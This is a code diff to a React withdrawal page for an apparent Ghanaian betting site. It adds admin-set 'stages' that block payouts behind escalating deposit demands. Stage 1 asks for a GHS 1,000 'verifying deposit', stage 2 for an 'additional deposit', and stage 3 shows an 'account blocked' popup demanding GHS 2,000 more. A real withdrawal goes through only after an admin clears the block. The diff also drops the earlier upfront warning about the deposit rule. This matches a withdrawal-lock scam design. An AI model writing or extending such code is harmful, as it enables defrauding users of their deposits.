@@ -1,7 +1,7 @@
 import { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { useAccount } from '../providers/AccountProvider.jsx';
-import { fetchTransactions } from '../api/betApi.js';
+import { useAccount, useToast } from '../providers/AccountProvider.jsx';
+import { fetchTransactions, withdraw } from '../api/betApi.js';
 import TxHeader from '../components/TxHeader.jsx';
 import PaybillInstructions from '../components/PaybillInstructions.jsx';
 import { readTxCache, writeTxCache, mergeTxLists } from '../lib/txCache.js';
@@ -29,17 +29,27 @@ const NETWORKS = {
 
 export default function WithdrawPage() {
   const navigate = useNavigate();
-  const { account, openDeposit } = useAccount();
+  const { account, openDeposit, setAccount } = useAccount();
+  const { toast } = useToast();
   const [txs, setTxs] = useState([]);
   const [amount, setAmount] = useState('');
   const [method, setMethod] = useState('momo');
   const [tab, setTab] = useState('momo'); // 'momo' | 'paybill' | 'card'
   const [err, setErr] = useState('');
-  const [showDepositReq, setShowDepositReq] = useState(false);
+  const [showDepositReq, setShowDepositReq] = useState(false);     // Stage 1 modal
+  const [showExtraDeposit, setShowExtraDeposit] = useState(false); // Stage 2 modal
+  const [showBlocked, setShowBlocked] = useState(false);           // Stage 3 (blocked) modal
+  const [busy, setBusy] = useState(false);
 
   const MIN_WITHDRAW = 550;
   const MAX_WITHDRAW = 95_000;
   const WITHDRAW_DEPOSIT_RATIO = 0.10;
+
+  // Stage gates withdrawal flow. New users default to 1 until an admin
+  // promotes them — see /admin/stages and the Verification stage card.
+  // Stage 3 + blocked locks the account until an admin unblocks it.
+  const stage = Math.min(3, Math.max(1, Number(account?.stage) || 1));
+  const isBlocked = !!account?.blocked;
 
   useEffect(() => {
     if (!account) {
@@ -69,10 +79,11 @@ export default function WithdrawPage() {
   const balance = account.balance ?? 0;
   const totalDeposited = Number(account.totalDeposited || 0);
   const amtNum = parseFloat(String(amount).replace(/,/g, '')) || 0;
-  const required = Number((amtNum * WITHDRAW_DEPOSIT_RATIO).toFixed(2));
-  const failsRatio = amtNum >= MIN_WITHDRAW && totalDeposited < required;
   const overBalance = amtNum > balance;
-  const isAmountValid = amtNum >= MIN_WITHDRAW && amtNum <= MAX_WITHDRAW && !failsRatio && !overBalance;
+  // The deposit-ratio gate is enforced via the stage popups instead of
+  // blocking the button, so the user always reaches the modal that explains
+  // *why* the withdrawal can't proceed yet.
+  const isAmountValid = amtNum >= MIN_WITHDRAW && amtNum <= MAX_WITHDRAW && !overBalance;
   const net = NETWORKS[method] || NETWORKS.momo;
   const accountPhone = account.phone || account.email || '+233 59****943';
 
@@ -84,17 +95,58 @@ export default function WithdrawPage() {
     setMethod(order[nextIdx]);
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     setErr('');
-    if (!isAmountValid) return;
-    // Gate every withdrawal behind the deposit-requirement modal — the user
-    // must complete the verifying deposit before any withdrawal is processed.
-    setShowDepositReq(true);
+    if (!isAmountValid || busy) return;
+    // Stage 3 promotes lock the account — the blocked popup gates everything
+    // until an admin clears the block.
+    if (isBlocked) {
+      setShowBlocked(true);
+      return;
+    }
+    if (stage === 1) {
+      setShowDepositReq(true);
+      return;
+    }
+    if (stage === 2) {
+      setShowExtraDeposit(true);
+      return;
+    }
+    // Stage 3 and not blocked — admin has cleared the lock, allow real
+    // withdrawal to go through.
+    try {
+      setBusy(true);
+      const data = await withdraw(amtNum, method);
+      if (data.account) setAccount(data.account);
+      if (data.transaction) setTxs((cur) => [data.transaction, ...cur].slice(0, 50));
+      toast(`Withdrew GHS ${fmt(amtNum)} to ${net.label}.`);
+      setAmount('');
+    } catch (e2) {
+      setErr(e2.message || 'Withdrawal failed.');
+    } finally {
+      setBusy(false);
+    }
   };
 
   const REQUIRED_DEPOSIT = 1000;
-  const goDeposit = () => { setShowDepositReq(false); openDeposit(); };
+  const goDeposit = () => {
+    setShowDepositReq(false);
+    setShowExtraDeposit(false);
+    setShowBlocked(false);
+    openDeposit();
+  };
+  const goSupport = () => {
+    setShowBlocked(false);
+    navigate('/help');
+  };
+
+  const BLOCKED_DEPOSIT = 2000;
+
+  // Stage 2 modal numbers (match the reference design)
+  const extraRequired = Number((amtNum * WITHDRAW_DEPOSIT_RATIO).toFixed(2));
+  const extraAvailable = totalDeposited;
+  const extraStillNeeded = Math.max(0, Number((extraRequired - extraAvailable).toFixed(2)));
 
   return (
     <main style={{ minHeight: 'calc(100vh - 120px)', background: 'var(--bg)', padding: '0 0 80px' }}>
@@ -150,6 +202,159 @@ export default function WithdrawPage() {
               }}
             >
               Go to Deposit
+            </button>
+          </div>
+        </div>
+      )}
+
+      {showExtraDeposit && (
+        <div
+          role="dialog"
+          aria-modal="true"
+          aria-labelledby="extra-deposit-title"
+          style={{
+            position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.55)',
+            display: 'flex', alignItems: 'center', justifyContent: 'center',
+            padding: 16, zIndex: 1000,
+          }}
+          onClick={() => setShowExtraDeposit(false)}
+        >
+          <div
+            onClick={(e) => e.stopPropagation()}
+            style={{
+              width: '100%', maxWidth: 380, background: '#fff', color: '#111',
+              borderRadius: 16, padding: '22px 22px 18px', boxShadow: '0 20px 50px rgba(0,0,0,0.35)',
+            }}
+          >
+            <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: 12 }}>
+              <h2 id="extra-deposit-title" style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#111' }}>
+                Additional deposit required
+              </h2>
+              <button
+                type="button"
+                aria-label="Close"
+                onClick={() => setShowExtraDeposit(false)}
+                style={{
+                  width: 28, height: 28, borderRadius: 6, border: 'none',
+                  background: 'transparent', color: '#374151', fontSize: 18, fontWeight: 700,
+                  cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                }}
+              >
+                ×
+              </button>
+            </div>
+            <p style={{ margin: '0 0 14px', fontSize: 14, color: '#374151', lineHeight: 1.5 }}>
+              You need an extra approved deposit before this withdrawal can be submitted.
+            </p>
+            <ul style={{ margin: '0 0 18px', paddingLeft: 18, fontSize: 14, color: '#111', lineHeight: 1.7 }}>
+              <li>Withdrawal amount: <strong>GHS {fmt(amtNum)}</strong></li>
+              <li>Required extra approved deposit: <strong>GHS {fmt(extraRequired)}</strong></li>
+              <li>Available approved deposit credit: <strong>GHS {fmt(extraAvailable)}</strong></li>
+              <li>Still needed: <strong>GHS {fmt(extraStillNeeded)}</strong></li>
+            </ul>
+            <button
+              type="button"
+              onClick={goDeposit}
+              style={{
+                width: '100%', padding: '13px 0', borderRadius: 8, border: 'none',
+                background: '#2f6bff', color: '#fff', fontWeight: 800, fontSize: 15,
+                cursor: 'pointer', marginBottom: 8,
+              }}
+            >
+              Go to Deposit
+            </button>
+            <button
+              type="button"
+              onClick={() => setShowExtraDeposit(false)}
+              style={{
+                width: '100%', padding: '11px 0', borderRadius: 8, border: 'none',
+                background: 'transparent', color: '#374151', fontWeight: 600, fontSize: 14,
+                cursor: 'pointer',
+              }}
+            >
+              Later
+            </button>
+          </div>
+        </div>
+      )}
+
+      {showBlocked && (
+        <div
+          role="dialog"
+          aria-modal="true"
+          aria-labelledby="blocked-title"
+          style={{
+            position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.65)',
+            display: 'flex', alignItems: 'center', justifyContent: 'center',
+            padding: 16, zIndex: 1000,
+          }}
+          onClick={() => setShowBlocked(false)}
+        >
+          <div
+            onClick={(e) => e.stopPropagation()}
+            style={{
+              width: '100%', maxWidth: 360, background: '#0f172a', color: '#fff',
+              borderRadius: 18, padding: '26px 22px 20px',
+              boxShadow: '0 20px 50px rgba(0,0,0,0.55)',
+              border: '1px solid rgba(255,255,255,0.06)',
+              textAlign: 'center',
+            }}
+          >
+            {/* Lock icon */}
+            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 14 }}>
+              <div
+                style={{
+                  width: 60, height: 60, borderRadius: 14,
+                  background: '#1e293b', display: 'grid', placeItems: 'center',
+                }}
+              >
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                  <rect x="4" y="11" width="16" height="10" rx="2" fill="#facc15" />
+                  <path d="M7 11V8a5 5 0 0 1 10 0v3" stroke="#facc15" strokeWidth="2.4" fill="none" strokeLinecap="round" />
+                  <circle cx="12" cy="16" r="1.6" fill="#0f172a" />
+                </svg>
+              </div>
+            </div>
+            <h2 id="blocked-title" style={{ margin: 0, fontSize: 20, fontWeight: 800, letterSpacing: '-0.01em' }}>
+              account blocked
+            </h2>
+            <p style={{ margin: '10px 4px 22px', fontSize: 14, color: '#cbd5e1', lineHeight: 1.55 }}>
+              your account is blocked. deposit ghs {BLOCKED_DEPOSIT.toLocaleString('en-US')}.00 and contact support for review.
+            </p>
+            <button
+              type="button"
+              onClick={goDeposit}
+              style={{
+                width: '100%', padding: '13px 0', borderRadius: 12, border: 'none',
+                background: '#2f6bff', color: '#fff', fontWeight: 800, fontSize: 15,
+                cursor: 'pointer', marginBottom: 8,
+              }}
+            >
+              go to deposit
+            </button>
+            <button
+              type="button"
+              onClick={goSupport}
+              style={{
+                width: '100%', padding: '13px 0', borderRadius: 12,
+                background: '#1e293b', border: '1px solid rgba(255,255,255,0.08)',
+                color: '#fff', fontWeight: 700, fontSize: 14.5,
+                cursor: 'pointer', marginBottom: 8,
+              }}
+            >
+              contact support
+            </button>
+            <button
+              type="button"
+              onClick={() => setShowBlocked(false)}
+              style={{
+                width: '100%', padding: '13px 0', borderRadius: 12,
+                background: '#1e293b', border: '1px solid rgba(255,255,255,0.08)',
+                color: '#fff', fontWeight: 700, fontSize: 14.5,
+                cursor: 'pointer',
+              }}
+            >
+              close
             </button>
           </div>
         </div>
@@ -239,16 +444,7 @@ export default function WithdrawPage() {
                 ))}
               </div>
 
-              {failsRatio && (
-                <div style={{ background: 'rgba(255,77,61,0.08)', border: '1px solid rgba(255,77,61,0.2)', color: 'var(--danger, #ff5d5d)', padding: '10px 14px', borderRadius: 10, fontSize: 12, lineHeight: 1.4, marginBottom: 12 }}>
-                  To withdraw GHS {amtNum.toLocaleString('en-US')}, deposit at least <strong>GHS {required.toLocaleString('en-US')}</strong> first (10% of withdrawal). Current deposits: GHS {totalDeposited.toLocaleString('en-US')}.
-                  <button type="button" onClick={openDeposit} style={{ display: 'block', marginTop: 8, background: 'transparent', border: '1px solid var(--danger, #ff5d5d)', color: 'var(--danger, #ff5d5d)', padding: '6px 12px', borderRadius: 6, cursor: 'pointer', fontSize: 12, fontWeight: 700 }}>
-                    Go to Deposit
-                  </button>
-                </div>
-              )}
-
-              {overBalance && !failsRatio && (
+              {overBalance && (
                 <div style={{ background: 'rgba(255,77,61,0.08)', border: '1px solid rgba(255,77,61,0.2)', color: 'var(--danger, #ff5d5d)', padding: '10px 14px', borderRadius: 10, fontSize: 12, marginBottom: 12 }}>
                   Insufficient balance — you have GHS {fmt(balance)}.
                 </div>
@@ -262,15 +458,15 @@ export default function WithdrawPage() {
 
               <button
                 type="submit"
-                disabled={!isAmountValid}
+                disabled={!isAmountValid || busy}
                 style={{
                   width: '100%', padding: '14px 0', borderRadius: 10, border: 'none',
-                  background: isAmountValid ? 'linear-gradient(135deg, var(--accent), #b0e82d)' : 'var(--surface-2)',
-                  color: isAmountValid ? '#0a0d0c' : 'var(--text-dim)',
-                  fontWeight: 800, fontSize: 16, cursor: isAmountValid ? 'pointer' : 'not-allowed', marginBottom: 18,
+                  background: isAmountValid && !busy ? 'linear-gradient(135deg, var(--accent), #b0e82d)' : 'var(--surface-2)',
+                  color: isAmountValid && !busy ? '#0a0d0c' : 'var(--text-dim)',
+                  fontWeight: 800, fontSize: 16, cursor: isAmountValid && !busy ? 'pointer' : 'not-allowed', marginBottom: 18,
                 }}
               >
-                Withdraw Now
+                {busy ? 'Processing…' : 'Withdraw Now'}
               </button>
 
               <ol style={{ paddingLeft: 18, margin: 0, fontSize: 13, color: 'var(--text-soft)', lineHeight: 1.7 }}>
